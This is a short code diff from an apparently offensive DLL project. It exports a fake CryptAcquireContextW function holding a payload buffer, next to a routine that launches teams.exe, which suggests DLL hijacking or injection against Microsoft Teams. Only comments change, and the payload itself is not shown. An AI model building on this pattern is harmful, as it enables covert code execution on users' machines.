@@ -171,8 +171,12 @@ void execute_Teams() {
     system("teams.exe");
 }
 
-// function that gets exported. Function seemed to work better when compiled as extern.
-    
+// function that gets exported and injected.
+
+// changed in order to compile through wsl    
+//__declspec(dllexport) void CryptAcquireContextW() {
+
+
 __declspec(dllexport) void CryptAcquireContextW() {
     char payload[PSIZE];
 
